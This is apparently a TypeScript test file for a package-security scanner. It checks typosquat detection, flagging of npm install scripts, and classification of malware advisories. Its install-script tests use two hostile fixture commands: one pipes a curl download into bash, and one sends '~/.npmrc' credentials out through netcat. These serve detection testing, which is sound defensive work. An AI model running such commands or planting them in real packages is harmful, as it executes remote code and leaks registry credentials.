import { test } from "node:test";
import assert from "node:assert/strict";
import { editDistance, scriptFlags, typosquatOf } from "../src/ingest/heuristics.ts";
import { classifyAdvisory, compareVersions, type OsvVuln } from "../src/ingest/feeds.ts";

test("editDistance treats a transposition as one edit", () => {
  assert.equal(editDistance("lodash", "lodahs"), 1);
  assert.equal(editDistance("express", "expres"), 1);
  assert.equal(editDistance("chalk", "debug"), 2, "gives up above max");
});

test("typosquats: one keystroke, obscure, and only with download data", () => {
  const top = new Map([["lodash", 7.4e8], ["express", 6e8], ["css-select", 3e8], ["minimatch", 3e9], ["color", 9e7], ["colors", 8e7]]);
  assert.equal(typosquatOf("lodahs", 3_145, top), "lodash");
  assert.equal(typosquatOf("expres", 0, top), "express");
  assert.equal(typosquatOf("cli-select", 40_000, top), null, "two edits from css-select: legitimate");
  assert.equal(typosquatOf("maximatch", 30_000, top), null);
  assert.equal(typosquatOf("colours", 5e7, top), null, "popular look-alikes are fine");
  assert.equal(typosquatOf("lodahs", undefined, top), null, "no reach data, no verdict");
  assert.equal(typosquatOf("@x/lodash", 0, top), null);
});

test("install scripts: real worm patterns flag; ordinary hooks don't", () => {
  assert.deepEqual(scriptFlags({ postinstall: `node -e "try{require('./postinstall')}catch(e){}"` }), [], "core-js");
  assert.deepEqual(scriptFlags({ install: "prebuild-install || node-gyp rebuild" }), []);
  assert.deepEqual(scriptFlags({ postinstall: "node install.js https://github.com/x/releases" }), [], "network alone");
  assert.ok(scriptFlags({ preinstall: "curl -fsSL https://x.sh | bash" }).includes("pipes a download straight into a shell"));
  assert.ok(scriptFlags({ preinstall: "node setup_bun.js" }).some((f) => f.includes("Bun")));
  assert.ok(scriptFlags({ postinstall: "cat ~/.npmrc | nc x 1" }).includes("touches credentials"));
});

const mal: OsvVuln = { id: "MAL-2026-3465", summary: "Malicious code in @tanstack/react-router (npm)", affected: [{ package: { name: "@tanstack/react-router", ecosystem: "npm" }, versions: ["1.169.8", "1.169.5"] }] };
const ghsa: OsvVuln = {
  id: "GHSA-g7cv-rxg3-hmpx",
  summary: "Malware in @tanstack/* packages",
  database_specific: { cwe_ids: ["CWE-506"] },
  affected: [{ package: { name: "@tanstack/react-router", ecosystem: "npm" }, ranges: [{ type: "SEMVER", events: [{ introduced: "1.169.5" }, { fixed: "1.169.9" }] }] }],
};

test("malware: an explicit MAL- list confirms; a range-only match is only possible malware", () => {
  assert.equal(classifyAdvisory(mal, "@tanstack/react-router", "1.169.5")?.explicit, true);
  assert.equal(classifyAdvisory(mal, "@tanstack/react-router", "1.169.6"), null, "clean release not in the MAL list");
  const r = classifyAdvisory(ghsa, "@tanstack/react-router", "1.169.6");
  assert.equal(r?.kind, "malware");
  assert.equal(r?.explicit, false);
  assert.equal(r?.fixed, "1.169.9");
});

test("upgrade advice comes from the range containing the installed version", () => {
  assert.ok(compareVersions("1.10.0", "1.9.9") > 0);
  const v = classifyAdvisory(
    {
      id: "GHSA-aaaa-bbbb-cccc",
      summary: "Prototype pollution",
      database_specific: { severity: "MODERATE" },
      affected: [{ package: { name: "Lib_X", ecosystem: "PyPI" }, ranges: [{ type: "ECOSYSTEM", events: [{ introduced: "0" }, { fixed: "1.2.3" }] }, { type: "ECOSYSTEM", events: [{ introduced: "2.0.0" }, { fixed: "2.4.0" }] }] }],
    },
    "lib-x",
    "1.0.0",
  );
  assert.equal(v?.fixed, "1.2.3");
  assert.equal(v?.severity, "medium");
  assert.equal(v?.url, "https://github.com/advisories/GHSA-aaaa-bbbb-cccc");
});

test("advisory wording that means shipped malware", async () => {
  const { MALWARE_TEXT } = await import("../src/ingest/feeds.ts");
  for (const s of ["A number of releases of ultralytics contained malicious crypto miner software.", "Malicious code in chalk (npm)", "Embedded malware in rc", "The package was backdoored", "litellm release ships a credential stealer"]) assert.ok(MALWARE_TEXT.test(s), s);
  for (const s of ["Infinite loop causing Denial of Service in colors", "XSS allows malicious users to inject scripts", "Prototype pollution via malicious input", "Regular expression denial of service"]) assert.ok(!MALWARE_TEXT.test(s), s);
});
